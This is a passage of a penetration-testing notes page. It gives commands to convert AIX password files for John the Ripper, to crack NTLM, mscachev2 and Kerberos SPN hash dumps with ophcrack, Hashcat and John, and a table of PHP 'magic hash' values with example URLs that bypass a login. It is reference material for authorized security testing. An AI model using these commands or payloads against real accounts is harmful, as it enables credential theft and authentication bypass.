<h4 id="aix-passwords">AIX Passwords<a class="headerlink" href="#aix-passwords" title="Permanent link">&para;</a></h4>
<p>/etc/security/passwd</p>
<p>Convert AIX passwd file to john format</p>
<div class="highlight"><pre><span></span><code>    cat $1|egrep &quot;:|password&quot; | sed &#39;s/password = //g&#39; | tr -d &quot;\t &quot; |sed &#39;:a;N;$!ba;s/:\n/:/g&#39;
</code></pre></div>
<h4 id="create-ntlm-hash-from-mac-cli">Create NTLM Hash from Mac CLI<a class="headerlink" href="#create-ntlm-hash-from-mac-cli" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code>    echo -n password | iconv -t UTF-16LE | openssl md4
</code></pre></div>
<h4 id="hash-cracking-examples">Hash Cracking Examples<a class="headerlink" href="#hash-cracking-examples" title="Permanent link">&para;</a></h4>
<p>ophcrack using tables</p>
<div class="highlight"><pre><span></span><code>    ophcrack -d /Volumes/data/table_vista_free/ -t /Volumes/data/table_vista_free -f ~/Desktop/ntlm.hashdump
</code></pre></div>
<p>Crack mscachev2 format with Hashcat (extremely slow)</p>
<div class="highlight"><pre><span></span><code>    ./hashcat -m 2100 -a 0 mscachev2.dump ./wordlists/* -r rules/dive.rule
</code></pre></div>
<p>Hashcat SPNs with wordlist</p>
<div class="highlight"><pre><span></span><code>    ./hashcat -m 13100 -a 0 spns.dump ./wordlists/* -r rules/dive.rule
</code></pre></div>
<p>JTR SPNs with wordlist</p>
<div class="highlight"><pre><span></span><code>    ./john --format=krb5tgs spns.dump --wordlist=
</code></pre></div>
<h4 id="magic-hashes">Magic Hashes<a class="headerlink" href="#magic-hashes" title="Permanent link">&para;</a></h4>
<p>Source: <a href="https://www.whitehatsec.com/blog/magic-hashes/">https://www.whitehatsec.com/blog/magic-hashes/</a></p>
<p>Use Case 1: Use the “Magic” Number below as a password or as a string that you expect to be hashed. When it is compared against the hash of the actual value, and if they both are treated as “0” and therefore evaluated as true, you will be able to log into the account without the valid password. This could be forced to happen in environments where automatic passwords are chosen for users during a forgot password flow and then attempting to log in immediately afterwards, as an example.</p>
<ul>
<li><a href="https://example.com/login.php?user=bob&amp;pass=240610708">https://example.com/login.php?user=bob&amp;pass=240610708</a></li>
</ul>
<p>Use Case 2: The attacker can simply take the example in the Hash column in the table below and use it as a value. In some cases these values are simply done as a look-up against known values (in memory, or perhaps dumped from a database and compared). By simply submitting the hash value, the magic hash may collide with other hashes which both are treated as “0” and therefore compare to be true. This could be caused to happen</p>
<ul>
<li><a href="https://example.com/login.php?user=bob&amp;token=0e462097431906509019562988736854">https://example.com/login.php?user=bob&amp;token=0e462097431906509019562988736854</a></li>
</ul>
<p>Hashes</p>
<div class="highlight"><pre><span></span><code>    HashType    HashLength “Magic”Number    Magic Hash                                  Found By
    md2         32          505144726       0e015339760548602306096794382326            WhiteHat Security, Inc.
    md4         32          48291204        0e266546927425668450445617970135            WhiteHat Security, Inc.
    md5         32          240610708       0e462097431906509019562988736854            Michal Spacek
    sha1        40          10932435112     0e07766915004133176347055865026311692244    Independently found by Michael A. Cleverly &amp; Michele Spagnuolo &amp; Rogdham
    sha224      56
    sha256      64
    sha384      96
    sha512      128
    ripemd128   32          315655854       0e251331818775808475952406672980            WhiteHat Security, Inc.
    ripemd160   40          20583002034     00e1839085851394356611454660337505469745    Michael A Cleverly
    ripemd256   64
    ripemd320   80
    whirlpool   128
    tiger128,3  32          265022640       0e908730200858058999593322639865            WhiteHat Security, Inc.
    tiger160,3  40          13181623570     00e4706040169225543861400227305532507173    Michele Spagnuolo
    tiger192,3  48
    tiger128,4  32          479763000       00e05651056780370631793326323796            WhiteHat Security, Inc.
    tiger160,4  40          62241955574     0e69173478833895223726165786906905141502    Michele Spagnuolo
    tiger192,4  48
    snefru      64
    snefru256   64
    gost        64
    adler32     8           FR              00e00099                                    WhiteHat Security, Inc.
    crc32       8           2332            0e684322                                    WhiteHat Security, Inc.
    crc32b      8           6586            0e817678                                    WhiteHat Security, Inc.
    fnv132      8           2186            0e591528                                    WhiteHat Security, Inc.
    fnv164      16          8338000         0e73845709713699                            WhiteHat Security, Inc.
    joaat       8           8409            0e074025                                    WhiteHat Security, Inc.
    haval128,3  32          809793630       00e38549671092424173928143648452            WhiteHat Security, Inc.
    haval160,3  40          18159983163     0e01697014920826425936632356870426876167    Independently found by Michael Cleverly &amp; Michele Spagnuolo
    haval192,3  48          48892056947     0e4868841162506296635201967091461310754872302741    Michael A. Cleverly
    haval224,3  56
    haval256,3  64
    haval128,4  32          71437579        0e316321729023182394301371028665            WhiteHat Security, Inc.
    haval160,4  40          12368878794     0e34042599806027333661050958199580964722    Michele Spagnuolo
    haval192,4  48
    haval224,4  56
    haval256,4  64
    haval128,5  32          115528287       0e495317064156922585933029613272            WhiteHat Security, Inc.
    haval160,5  40          33902688231     00e2521569708250889666329543741175098562    Michele Spagnuolo
    haval192,5  48          52888640556     0e9108479697641294204710754930487725109982883677    Michele Spagnuolo
    haval224,5  56
    haval256,5  64
</code></pre></div>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../git-clone-entire-org/" title="Git clone all organizational repos" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Git clone all organizational repos
              </span>
            </div>
          </a>
        
        
          <a href="../../2018/a-deep-dive-into-cobalt-strike-malleable-c2/" title="A Deep Dive into Cobalt Strike Malleable C2" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                A Deep Dive into Cobalt Strike Malleable C2
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            © 2019 Threatexpress
          </div>
        
      </div>
      <div class="md-social">
  
    
    
    
    
      
      
    
    <a href="https://github.com/threatexpress" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://twitter.com/joevest" target="_blank" rel="noopener" title="twitter.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253"/></svg>
    </a>
  
</div>
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../../..", "features": [], "search": "../../../assets/javascripts/workers/search.f8cc74c7.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../../assets/javascripts/bundle.c8b220af.min.js"></script>
      
        <script src="https://platform.twitter.com/widgets.js"></script>
      
        <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
      
        <script src="../../../js/extra.js"></script>
      
    
  </body>
</html>